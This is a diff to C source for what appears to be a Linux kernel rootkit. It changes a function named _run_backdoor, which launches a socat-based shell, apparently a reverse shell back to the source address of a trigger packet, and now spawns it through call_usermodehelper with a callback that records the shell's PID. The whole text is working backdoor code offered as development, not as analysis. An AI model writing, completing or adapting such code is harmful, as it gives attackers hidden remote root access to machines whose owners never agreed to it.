@@ -235,6 +235,7 @@ static int _run_backdoor(struct iphdr *iph, struct tcphdr *tcph, int select) {
     char *envp[] = {"HOME=/", "TERM=linux", NULL};
     int ret = -1;
     pid_t shellpid = 0;
+    struct subprocess_info *info;
     __be32 saddr = iph->saddr;
     const char *binpath = _locate_bdbin(select == RR_SOCAT_TTY ?
             RR_SOCAT : select);
@@ -254,7 +255,10 @@ static int _run_backdoor(struct iphdr *iph, struct tcphdr *tcph, int select) {
     }
 
     argv[2] = rev;
-    ret = kv_run_system_command(argv);
+    if ((info = call_usermodehelper_setup(argv[0], argv, envp,
+                    GFP_KERNEL, _retrieve_pid_cb, NULL, &shellpid))) {
+        ret = call_usermodehelper_exec(info, UMH_WAIT_EXEC);
+    }
 
     /*
      * wait a little while before the
